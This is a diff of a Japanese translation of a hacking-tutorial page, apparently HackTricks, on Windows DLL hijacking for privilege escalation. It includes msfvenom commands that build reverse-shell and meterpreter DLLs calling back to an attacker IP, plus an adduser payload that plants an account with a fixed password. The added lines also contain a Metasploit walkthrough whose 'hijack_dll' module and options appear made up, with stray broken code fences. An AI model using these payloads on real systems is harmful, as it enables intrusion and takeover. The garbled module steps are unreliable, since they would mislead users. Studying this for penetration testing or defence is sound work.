@@ -4,23 +4,23 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-もし、**ハッキングのキャリア**に興味があり、**解読不可能なものを解読する**ことに興味がある場合は、**採用中です**（_流暢なポーランド語の読み書きが必要です_）。
+もし、**ハッキングのキャリア**に興味があり、**解読不可能なものを解読する**ことに興味がある場合は、**採用中です**（流暢なポーランド語の読み書きが必要です）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 ## 定義
 
-まず、定義を確認しましょう。DLLハイジャッキングは、最も広義には、**正規/信頼されたアプリケーションを誤って/トリックして任意のDLLを読み込ませる**ことです。_DLL Search Order Hijacking_、_DLL Load Order Hijacking_、_DLL Spoofing_、_DLL Injection_、_DLL Side-Loading_などの用語は、しばしば間違って同じ意味で使用されます。
+まず、定義を確認しましょう。DLLハイジャッキングは、広義には**正規/信頼されたアプリケーションを誤って/トリックして任意のDLLを読み込ませる**ことです。_DLL Search Order Hijacking_、_DLL Load Order Hijacking_、_DLL Spoofing_、_DLL Injection_、_DLL Side-Loading_などの用語は、しばしば間違って同じ意味で使用されます。
 
 Dllハイジャッキングは、**コードの実行**、**永続性の確保**、**特権のエスカレーション**に使用することができます。その3つのうち、**特権のエスカレーション**は非常に見つけにくいです。ただし、これは特権のエスカレーションセクションの一部であるため、このオプションに焦点を当てます。また、目標に関係なく、dllハイジャッキングは同じ方法で実行されます。
 
@@ -33,11 +33,11 @@ Dllハイジャッキングは、**コードの実行**、**永続性の確保**
 3. **Phantom DLLハイジャック**: 正規のアプリケーションが読み込もうとする欠落/存在しないDLLの代わりに悪意のあるDLLを配置します \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)]。
 4. **DLLリダイレクト**: DLLの検索場所を変更します。たとえば、`%PATH%`環境変数を編集するか、`.exe.manifest` / `.exe.local`ファイルを編集して、悪意のあるDLLを含むフォルダを追加します \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)]。
 5. **WinSxS DLLの置き換え**: 対象のDLLの関連するWinSxSフォルダに正規のDLLを悪意のあるDLLで置き換えます。DLLサイドローディングとも呼ばれることがよくあります \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)]。
-6. **相対パスDLLハイジャック**: 正規のアプリケーションをユーザーが書き込み可能なフォルダにコピー（オプションで名前を変更）し、悪意のあるDLLと一緒に配置します。使用方法によっては、（署名済みの）バイナリプロキシ実行 \[[8](https://attack.mitre.org/techniques/T1218/)]と類似点があります。これのバリエーションは、（ややオキシモロン的に）「_bring your own LOLbin_」 \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)]と呼ばれ、正規のアプリケーションが悪意のあるDLLと一緒に提供されます（被害者のマシン上の正規の場所からコピーされるのではなく）。
+6. **相対パスDLLハイジャック**: 正規のアプリケーションをユーザーが書き込み可能なフォルダにコピー（オプションで名前を変更）し、悪意のあるDLLと一緒に配置します。使用方法によっては、（署名された）バイナリプロキシ実行 \[[8](https://attack.mitre.org/techniques/T1218/)]と類似点があります。これのバリエーションは、（ややオキシモロン的に）「_bring your own LOLbin_」 \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)]と呼ばれ、正規のアプリケーションが悪意のあるDLLと一緒に持ち込まれます（被害者のマシンの正規の場所からコピーされるのではなく）。
 
-## 欠落しているDLLの検索
+## 欠落しているDllを見つける
 
-システム内の欠落しているDLLを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)をsysinternalsから実行し、次の2つのフィルタを**設定**することです。
+システム内の欠落しているDllを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)をsysinternalsから実行し、次の2つのフィルタを**設定**することです。
 
 ![](<../../.gitbook/assets/image (311).png>)
 
@@ -70,7 +70,7 @@ Dllハイジャッキングは、**コードの実行**、**永続性の確保**
 
 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出される場合、検索は**LoadLibraryEx**がロードしている実行可能モジュールのディレクトリから開始されます。
 
-最後に、**dllは名前だけでなく絶対パスを指定してロードされることもあります**。その場合、そのdllは**そのパスだけで検索されます**（dllに依存関係がある場合、名前でロードされたときと同様に検索されます）。
+最後に、**dllは名前だけでなく絶対パスを指定してロードすることもできます**。その場合、そのdllは**そのパスだけで検索されます**（dllに依存関係がある場合、名前でロードされたときと同様に検索されます）。
 
 検索順序を変更する他の方法もありますが、ここでは説明しません。
 
@@ -88,9 +88,9 @@ Dllハイジャッキングは、**コードの実行**、**永続性の確保**
 * **dllが不足している**フォルダに**書き込み権限**を持つ（おそらく実行可能なディレクトリまたはシステムパス内のフォルダ）。
 
 はい、前提条件は複雑で見つけるのが難しいです。**デフォルトでは特権のある実行可能ファイルがdllが不足しているのは奇妙**であり、**システムパスのフォルダに書き込み権限を持つのはさらに奇妙**です（デフォルトではできません）。しかし、設定が誤っている環境では、これが可能です。\
-もし要件を満たす幸運がある場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックしてみてください。このプロジェクトの**主な目標はUACのバイパス**ですが、おそらく書き込み権限を持つフォルダのパスを変更するだけで使用できるWindowsバージョンのDLLハイジャックのPoCが見つかるかもしれません。
+もし要件を満たす幸運がある場合は、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックしてみてください。このプロジェクトの**主な目標はUACのバイパス**ですが、おそらく書き込み権限を持つフォルダのパスを変更するだけで使用できるWindowsバージョンのDLLハイジャックのPoCを見つけることができます。
 
-フォルダの**アクセス許可を確認する**には、次のコマンドを実行します：
+フォルダの**アクセス権限を確認する**には、次のコマンドを実行します：
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
@@ -137,7 +137,7 @@ dumpbin /export /path/file.dll
 
 ### **Meterpreter**
 
-**rev shellを取得（x64）：**
+**Revシェルを取得（x64）：**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -148,7 +148,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 
 2. Metasploitコンソールを開き、以下のコマンドを実行します。
 
-   ```shell
+   ```bash
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST <attacker IP>
@@ -158,13 +158,41 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 
    `<attacker IP>`と`<attacker port>`を攻撃者のIPアドレスとポートに置き換えてください。
 
-3. ターゲットマシンで、メータープリターを実行するために誘導する方法を選択します。以下の手法のいずれかを使用できます。
+3. ターゲットマシンで、メータープリターを実行するために、悪意のあるDLLを使用します。
 
-   - ファイルの実行：攻撃者が作成した悪意のあるファイルをターゲットマシンで実行させます。
-   - ソーシャルエンジニアリング：攻撃者がターゲットユーザーを騙して、悪意のあるファイルを実行させます。
-   - セキュリティホールの利用：既知のセキュリティホールを悪用して、メータープリターを実行します。
+   - DLLハイジャック攻撃を実行するために、ターゲットマシン上のアプリケーションの実行可能ファイルを特定します。
 
-4. メータープリターがターゲットマシンで実行されると、攻撃者はリモートシェルを取得し、ターゲットマシンを制御できるようになります。
+   - Metasploitコンソールで以下のコマンドを実行し、DLLハイジャック攻撃のための悪意のあるDLLを生成します。
+
+     ```bash
+     use exploit/windows/local/hijack_dll
+     set SESSION <session ID>
+     set DLL_PATH <path to malicious DLL>
+     exploit
+     ```
+
+     `<session ID>`をターゲットマシンのセッションIDに、`<path to malicious DLL>`を悪意のあるDLLのパスに置き換えてください。
+
+4. ターゲットマシンで、DLLハイジャック攻撃を実行するために、悪意のあるDLLをターゲットアプリケーションのディレクトリに配置します。
+
+5. ターゲットマシンで、ターゲットアプリケーションを実行すると、メータープリターが攻撃者のマシンに接続します。
+
+6. Metasploitコンソールで、`sessions`コマンドを使用して接続されたセッションを表示します。
+
+   ```bash
+   sessions
+   ```
+
+   メータープリターのセッションが表示されます。
+
+7. メータープリターセッションを選択し、攻撃を続行するために必要なコマンドを実行します。
+
+   ```bash
+   sessions -i <session ID>
+   ```
+
+   `<session ID>`をメータープリターセッションのIDに置き換えてください。
+```
 ```
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
@@ -175,7 +203,7 @@ msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### あなた自身の
 
-注意してください、いくつかの場合、コンパイルしたDllは、被害者プロセスによってロードされる**複数の関数をエクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはロードできず、攻撃は失敗します**。
+注意してください。いくつかの場合、コンパイルしたDllは、被害者プロセスによってロードされる複数の関数を**エクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはロードできず**、**攻撃は失敗します**。
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -256,7 +284,7 @@ break;
 return TRUE;
 }
 ```
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
 もしあなたが**ハッキングのキャリア**に興味があり、**解読不能なものをハック**したいのであれば、**採用中です！**（流暢なポーランド語の読み書きが必要です）。
 
